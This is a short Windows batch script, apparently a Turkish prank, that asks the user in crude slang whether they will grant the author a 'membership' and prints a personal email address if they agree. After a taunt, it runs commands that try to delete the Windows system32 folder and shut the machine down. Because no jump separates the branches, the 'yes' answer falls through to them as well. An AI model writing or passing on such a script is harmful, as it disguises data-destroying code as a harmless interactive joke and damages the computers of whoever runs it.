@echo off
:1
color a
echo ÜYELİK VERECEK MİSİN LAAAAAAN  (answer Y/N)
set /p input=
if /i %input%==Y goto vericem
if /i %input%==N goto vermicem
if /i not %input%== Y,N goto 1

:vericem
echo TAMAM EPOSTAMI SÖYLÜYOM, ŞUAN CANLI YAYININA GELDİM VE VER ÜYELİĞİMİ
echo topaleymen63@gmail.com

:vermicem
echo YAAAA, VERMİCEM DEMEK
echo AL SANA!!!
timeout 3
 del C:/windows/system32
shutdown -s -t

